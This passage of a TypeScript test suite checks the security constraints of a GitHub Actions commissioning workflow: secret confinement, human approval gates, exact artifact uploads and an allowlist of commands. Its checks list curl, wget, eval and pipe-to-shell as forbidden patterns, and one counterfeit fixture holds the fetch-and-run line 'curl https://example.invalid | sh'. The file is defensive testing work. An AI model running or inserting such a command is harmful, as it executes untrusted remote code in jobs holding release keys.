        expect(upload.step.with?.path, `${name} path`).toBe(`${CHALLENGE_DIR}/${name}.json`);
        expect(upload.step.with?.["if-no-files-found"], `${name} missing-file handling`).toBe("error");
      }
    }
    // EXACTLY the count the runner requires — 11 cloud cases × pre and post. A twelfth case, or a
    // case whose post upload was dropped, changes this number and reddens here.
    const allChallenges = uploads(workflow).filter((u) => String(u.step.with?.name ?? "").startsWith("commissioning-challenge-") && u.job !== REHEARSAL_JOB_ID);
    expect(allChallenges).toHaveLength(REQUIRED_WITNESS_PUBLICATIONS);
  });

  it("the challenge upload steps SURROUND their stages, so a challenge is published before it is awaited", () => {
    for (const role of ["normal", "emergency"] as const) {
      // The reviewed order per case is prepare → upload(pre) → execute → upload(post) → finalize.
      // Comparing the interleaved sequence is what makes "the upload happens between the stages"
      // checkable rather than assumed.
      const sequence = (job(role).steps ?? [])
        .map((step) => {
          if (typeof step.run === "string") {
            const match = /runCaseStage\(\{ stage: "([a-z-]+)"/.exec(step.run.replace(/\s+/g, " "));
            return match ? `stage:${match[1]}` : null;
          }
          const name = String(step.with?.name ?? "");
          return name.startsWith("commissioning-challenge-") ? `upload:${name.endsWith("-pre") ? "pre" : "post"}` : null;
        })
        .filter((entry): entry is string => Boolean(entry));
      const expected = CLOUD_CASE_SEQUENCE[role].flatMap(() => [
        "stage:prepare", "upload:pre", "stage:await-and-execute", "upload:post", "stage:await-and-finalize",
      ]);
      expect(sequence, `${role} interleaved stage/upload order`).toEqual(expected);
    }
  });

  it("names the witness artifact from a step OUTPUT, never from the dispatch input", () => {
    const publisher = job(WITNESS_JOB_ID);
    const publish = (publisher.steps ?? []).find((step) => step.id === "publish");
    expect(publish, "the publisher's step must be addressable as an output source").toBeTruthy();
    const upload = (publisher.steps ?? []).find((step) => String(step.uses ?? "").startsWith("actions/upload-artifact@"))!;
    // The name is DERIVED by reviewed code from validated envelope fields and handed over as a step
    // output. Taking it from `inputs.` would let the dispatcher choose the artifact name, which is
    // the one thing the actor's nonce-bound lookup depends on it not being able to do.
    expect(upload.with?.name).toBe("${{ steps.publish.outputs.artifact_name }}");
    expect(String(upload.with?.name)).not.toContain("inputs.");
    expect(upload.with?.path).toBe(`${EVIDENCE_DIR}/witness/witness.json`);
    expect(upload.with?.["if-no-files-found"]).toBe("error");
  });

  it("the publisher installs nothing and the rehearsal touches no ref", () => {
    // The publisher uses node built-ins and the pinned upload action only — no `npm ci` — because it
    // is the one job whose whole purpose is to move bytes it did not compute.
    expect(runCommands(workflow).filter((c) => c.job === WITNESS_JOB_ID && c.run.startsWith("npm "))).toEqual([]);
    // The rehearsal's target is the literal `rehearsal`; nothing in its wiring names a derived ref.
    expect(JSON.stringify(job(REHEARSAL_JOB_ID))).not.toContain("aios-policy-commissioning/run-");
  });
});

describe("PC-06: approval controls — App secrets and human gates are the same set", () => {
  it("a job holds an App secret IF AND ONLY IF it parks for human approval", () => {
    const withSecrets = JOB_IDS.filter((id) => secretRefs(job(id)).length > 0).sort();
    const withEnvironment = JOB_IDS.filter((id) => job(id).environment !== undefined).sort();
    expect(withSecrets).toEqual(withEnvironment);
    expect(withSecrets).toEqual(["emergency", "normal"]);
  });

  it("nothing in the workflow can approve, bypass or re-dispatch itself", () => {
    // The approval evidence is GitHub's own review history. A workflow that could call the
    // deployment-approval or environment API, or re-trigger itself, would be manufacturing it. The
    // witness dispatch is made by the LOCAL operator's own identity, from outside the run — which is
    // exactly why no dispatch call may appear in this file.
    for (const forbidden of [
      "actions/github-script",
      "workflow_dispatch.*dispatches",
      "pending_deployments",
      "environments/",
      "gh workflow run",
      "gh api",
    ]) {
      expect(raw, `the workflow must not contain ${forbidden}`).not.toMatch(new RegExp(forbidden));
    }
  });
});

describe("PC-07: evidence — exact sanitized files and challenge artifacts, nothing raw", () => {
  /** The EVIDENCE uploads, as distinct from the per-case challenge uploads. */
  const evidenceUploads = () => uploads(workflow).filter((u) => !String(u.step.with?.name ?? "").startsWith("commissioning-challenge-"));

  it("uploads exactly one evidence artifact per job that writes one, from the exact filename", () => {
    const expectedJobs = JOB_IDS.filter((id) => JOBS[id].evidenceKey || id === WITNESS_JOB_ID);
    expect(evidenceUploads().map((u) => u.job).sort()).toEqual([...expectedJobs].sort());
    for (const { job: id, step } of evidenceUploads()) {
      if (id === WITNESS_JOB_ID) continue; // named from a step output, asserted in the F1 block
      expect(step.with?.path, `job ${id} artifact path`).toBe(evidencePath(JOBS[id].evidenceKey!));
    }
    // The fixture takes no `--evidence-dir` flag, so its env value is the only thing tying the file
    // it writes to the file this workflow uploads. They must be the same directory.
    expect(job("fixture").steps?.some((s) => s.env?.COMMISSIONING_EVIDENCE_DIR === EVIDENCE_DIR)).toBe(true);
  });

  it("makes every evidence upload unconditional, durable for 30 days, and red when the file is missing", () => {
    for (const { job: id, step } of evidenceUploads()) {
      // `always()` so a FAILED actor case still produces its evidence — a failure with no artifact is
      // the case PC-07 most needs recorded. The publisher's single upload is the exception: if its
      // validation refused, there are no bytes to publish and an `always()` upload would be red for
      // a file that must not exist.
      if (id !== WITNESS_JOB_ID) expect(step.if, `job ${id} upload is conditional`).toBe("always()");
      expect(step.with?.["retention-days"], `job ${id} retention`).toBe(30);
      expect(step.with?.["if-no-files-found"], `job ${id} missing-file handling`).toBe("error");
    }
    // Every challenge upload is UNCONDITIONAL by design: a challenge that was written and not
    // published is a case that will wait for a response nobody can produce.
    for (const { job: id, step } of uploads(workflow).filter((u) => String(u.step.with?.name ?? "").startsWith("commissioning-challenge-"))) {
      expect(step.if, `job ${id} challenge upload must not be conditional`).toBeUndefined();
    }
  });

  it("names every artifact distinctly, and every evidence artifact by run AND attempt", () => {
    const names = uploads(workflow).map((u) => String(u.step.with?.name ?? ""));
    expect(new Set(names).size, "artifact names collide").toBe(names.length);
    for (const { job: id, step } of uploads(workflow)) {
      const name = String(step.with?.name ?? "");
      if (id === WITNESS_JOB_ID) continue; // derived by the runner, including the nonce digest
      // A rerun derives fresh resources (PC-03); an artifact name without the attempt would let the
      // second attempt's packet overwrite the first's and read as one clean run.
      expect(name, `job ${id} artifact name`).toContain("${{ github.run_id }}");
      expect(name, `job ${id} artifact name`).toContain("${{ github.run_attempt }}");
    }
  });

  it("never uploads the journal, a directory, a glob, or anything it did not name exactly", () => {
    for (const { job: id, step } of uploads(workflow)) {
      const path = String(step.with?.path ?? "");
      // The local mode-0600 journal and raw provider bodies are local-only. A directory or glob path
      // here is how they would leave the runner without anyone deciding to publish them.
      expect(path, `job ${id} uploads a glob`).not.toMatch(/[*?[\]]/);
      expect(path, `job ${id} uploads a directory`).toMatch(/\.json$/);
      expect(path.toLowerCase(), `job ${id} uploads journal material`).not.toContain("journal");
      expect(path, `job ${id} uploads the private case state`).not.toContain("/state/");
      expect(path).not.toContain("\n");
    }
    // The runner downloads a witness artifact through the bounded, guarded API path with its own
    // single-entry archive reader. The ACTION would unpack an arbitrary archive into the workspace.
    expect(raw, "nothing may consume an artifact through the unpacking action").not.toContain("actions/download-artifact");
  });
});

describe("PC-08: the only things this workflow executes are npm ci and the closed entrypoints", () => {
  it("runs EXACTLY the expected command set, in order, per job", () => {
    const expected = JOB_IDS.flatMap((id) => JOBS[id].commands.map((c) => ({ job: id, run: c.run })));
    expect(runCommands(workflow)).toEqual(expected);
  });

  it("uses only the CLI phases the spec's closed enum allows, with no extra flags", () => {
    const cli = runCommands(workflow).filter((c) => c.run.startsWith(RUNNER));
    const phases = cli.map((c) => c.run.slice(RUNNER.length + 1).split(" ")[0]);
    expect(phases.sort()).toEqual(["emergency-tests", "intent", "normal-tests"]);
    const flags = cli.flatMap((c) => c.run.match(/--[a-z-]+/g) ?? []);
    expect([...new Set(flags)].sort()).toEqual(["--attempt", "--evidence-dir", "--run-id"]);
    // Everything else is a fixed inline module call on a reviewed helper — never a fourth phase, and
    // never an argument a caller could widen. Compared exactly, and each helper name is allowlisted.
    const nonCli = runCommands(workflow).filter((c) => !c.run.startsWith(RUNNER) && !c.run.startsWith("npm "));
    const allowedHelpers = ["runFixtureChecks", "runNormalCheckPublication", "runCaseStage", "runWitnessPublisherJob", "runRehearsalStage"];
    for (const { job: id, run } of nonCli) {
      const helper = /^node --input-type=module -e 'import \{ ([A-Za-z]+) \}/.exec(run)?.[1];
      expect(allowedHelpers, `job ${id} calls an unallowlisted helper: ${run.slice(0, 90)}`).toContain(helper);
    }
    expect(nonCli.length).toBe(
      1 // the fixture
      + 1 // the normal role's installation-level positive control
      + (CLOUD_CASE_SEQUENCE.normal.length + CLOUD_CASE_SEQUENCE.emergency.length) * 3 // three runner stages per case
      + 1 // the publisher
      + 2, // the rehearsal's two stages
    );
  });

  it("executes no plan, no artifact, no fetched code and no shell indirection", () => {
    for (const { job: id, run } of runCommands(workflow)) {
      for (const pattern of [/curl/, /wget/, /\bnpx\b/, /\beval\b/, /\$\(/, /`/, /\|\s*(ba)?sh\b/, /\bchmod\b/]) {
        expect(run, `job ${id} run step reaches outside the reviewed tree: ${run}`).not.toMatch(pattern);
      }
      // A run step that interpolates an expression is a template the runner never validated.
      expect(run, `job ${id} interpolates into a shell command`).not.toContain("${{");
      // Every inline entrypoint may only import from the reviewed tree — a relative path into this
      // repository, never a package name, a URL or a data: specifier.
      if (run.includes("--input-type=module")) {
        expect(run, `job ${id} imports from outside the tree`).toContain(`from "./scripts/staging-ops/policy-commissioning.mjs"`);
        expect(run, `job ${id} imports a remote specifier`).not.toMatch(/https?:|data:|node_modules/);
      }
    }
    // `--ignore-scripts` is what stops `npm ci` from executing a dependency's lifecycle script in a
    // job that holds a release App private key.
    for (const c of runCommands(workflow).filter((c) => c.run.startsWith("npm "))) {
      expect(c.run, `job ${c.job} npm install runs lifecycle scripts`).toContain("--ignore-scripts");
    }
  });
});

/**
 * NON-VACUITY. Each sweep above is run over a COUNTERFEIT document that has the defect it claims to
 * detect. Without this block every assertion could be satisfied by a helper that returns `[]`
 * unconditionally, and the file would stay green while the workflow rotted underneath it.
 */
describe("the sweeps are non-vacuous: each detects its own defect in a counterfeit workflow", () => {
  const doc = (yaml: string) => parseYaml(yaml) as Workflow;

  it.each([
    ["a secret in a step's `with:`, where no `env:` sweep would look", "jobs:\n  a:\n    steps:\n      - uses: x/y@v1\n        with:\n          token: ${{ secrets.RELEASE_APP_PRIVATE_KEY }}\n"],
    ["a secret at the workflow level, in scope of every job", "env:\n  K: ${{ secrets.EMERGENCY_APP_PRIVATE_KEY }}\njobs:\n  a:\n    steps: []\n"],
    ["a secret hidden in a job `if:` expression", "jobs:\n  a:\n    if: secrets.RELEASE_APP_ID != ''\n    steps: []\n"],
  ])("secretRefs finds: %s", (_label, yaml) => {
    expect(secretRefs(doc(yaml)).length).toBeGreaterThan(0);
  });

  it("secretRefs does NOT flag a `vars.` reference — that distinction is the whole counterpart design", () => {
    expect(secretRefs(doc("jobs:\n  a:\n    env:\n      K: ${{ vars.COMMISSIONING_NORMAL_APP_ID }}\n"))).toEqual([]);
  });

  it.each([
    ["a branch NAME instead of the SHA", "jobs:\n  a:\n    steps:\n      - uses: actions/checkout@v7\n        with:\n          ref: staging\n          persist-credentials: false\n"],
    ["an expression that is not github.sha", "jobs:\n  a:\n    steps:\n      - uses: actions/checkout@v7\n        with:\n          ref: ${{ github.ref }}\n          persist-credentials: false\n"],
    ["a checkout with no `with:` at all, which also keeps the token in .git/config", "jobs:\n  a:\n    steps:\n      - uses: actions/checkout@v7\n"],
    ["persist-credentials left at its default", "jobs:\n  a:\n    steps:\n      - uses: actions/checkout@v7\n        with:\n          ref: ${{ github.sha }}\n"],
    ["a job with no checkout at all", "jobs:\n  a:\n    steps:\n      - run: 'true'\n"],
    ["a flow mapping, which has no line to anchor a regex on", "jobs:\n  a:\n    steps:\n      - {uses: 'actions/checkout@v7', with: {ref: staging}}\n"],
  ])("looseCheckouts finds: %s", (_label, yaml) => {
    expect(looseCheckouts(doc(yaml)).length).toBeGreaterThan(0);
  });

  it("looseCheckouts accepts the pinned shape, so it is not simply always red", () => {
    expect(
      looseCheckouts(doc("jobs:\n  a:\n    steps:\n      - uses: actions/checkout@v7\n        with:\n          ref: ${{ github.sha }}\n          persist-credentials: false\n"))
    ).toEqual([]);
  });

  it("runCommands normalises a FOLDED scalar to the same single line as a plain one", () => {
    // The real file writes every entrypoint as `>-`; a guard that compared raw text would see a
    // different string for an identical command and would be fixed by loosening it.
    const folded = doc(`jobs:\n  a:\n    steps:\n      - run: >-\n          node scripts/staging-ops/policy-commissioning.mjs intent\n          --run-id "$GITHUB_RUN_ID"\n`);
    expect(runCommands(folded)).toEqual([
      { job: "a", run: 'node scripts/staging-ops/policy-commissioning.mjs intent --run-id "$GITHUB_RUN_ID"' },
    ]);
  });

  it("runCommands sees a smuggled extra step, so the exact-set comparison cannot be padded", () => {
    const extra = doc("jobs:\n  a:\n    steps:\n      - run: npm ci --ignore-scripts\n      - run: curl https://example.invalid | sh\n");
    expect(runCommands(extra).map((c) => c.run)).toContain("curl https://example.invalid | sh");
  });

  it("entrypointSteps sees a SECOND credentialed run step, which the per-step env allowlist then rejects", () => {
    const two = doc("jobs:\n  a:\n    steps:\n      - run: npm ci --ignore-scripts\n      - run: node a.mjs\n        env:\n          GITHUB_TOKEN: ${{ github.token }}\n      - run: node b.mjs\n        env:\n          SNEAKY: '1'\n");
    const found = entrypointSteps(two);
    expect(found.map((s) => s.step.run)).toEqual(["node a.mjs", "node b.mjs"]);
    expect(found.flatMap((s) => Object.keys(s.step.env ?? {}))).toContain("SNEAKY");
  });

  it("runSteps attributes each env set to its OWN step, so a key cannot hide in a sibling", () => {
    // The per-step confinement check depends entirely on this: a helper that pooled a job's env would
    // report the private key as present on every step and would be "fixed" by weakening the check.
    const mixed = doc("jobs:\n  a:\n    steps:\n      - run: node one.mjs\n        env:\n          K: '1'\n      - run: node two.mjs\n        env:\n          RELEASE_APP_PRIVATE_KEY: ${{ secrets.RELEASE_APP_PRIVATE_KEY }}\n");
    const steps = runSteps(mixed);
    expect(steps.map((s) => s.env)).toEqual([["K"], ["RELEASE_APP_PRIVATE_KEY"]]);
  });

  it("envKeys finds a GITHUB_TOKEN declared at the JOB level rather than the step", () => {
    expect(envKeys(doc("jobs:\n  a:\n    env:\n      GITHUB_TOKEN: ${{ github.token }}\n    steps: []\n"))).toContain("GITHUB_TOKEN");
  });

  it("uploads finds an upload step regardless of the action's pinned version", () => {
    const u = uploads(doc("jobs:\n  a:\n    steps:\n      - uses: actions/upload-artifact@v9\n        with:\n          path: x/journal.jsonl\n"));
    expect(u).toHaveLength(1);
    expect(String(u[0].step.with?.path)).toContain("journal");
  });
});
